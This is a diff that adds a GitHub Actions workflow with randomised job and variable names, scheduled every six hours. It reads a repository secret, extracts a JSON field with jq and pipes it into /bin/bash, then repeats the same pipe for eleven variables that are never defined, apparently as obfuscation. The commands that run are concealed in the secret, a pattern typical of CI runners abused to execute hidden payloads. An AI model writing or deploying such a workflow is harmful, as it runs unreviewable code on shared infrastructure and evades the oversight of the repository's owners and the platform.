@@ -1,0 +1,29 @@
+name: jeanspheasant
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jeanspheasant
+        env:
+          qgjt8493: ${{ secrets.qgjt8493 }}
+        run: |
+          echo $qgjt8493 | jq -r .yhegy1870 | /bin/bash
+          echo $ejs98214 | jq -r .f3 | /bin/bash
+          echo $m364 | jq -r .upvw2479 | /bin/bash
+          echo $qnql306 | jq -r .n98 | /bin/bash
+          echo $y55157 | jq -r .gej0295 | /bin/bash
+          echo $upuu4 | jq -r .oqbnz43 | /bin/bash
+          echo $m9 | jq -r .cfboz3 | /bin/bash
+          echo $a102 | jq -r .qpl4 | /bin/bash
+          echo $pdfm21 | jq -r .ghq881 | /bin/bash
+          echo $y8 | jq -r .fjene6 | /bin/bash
+          echo $n0 | jq -r .rll0 | /bin/bash
+          echo $r66 | jq -r .mreps7 | /bin/bash
+
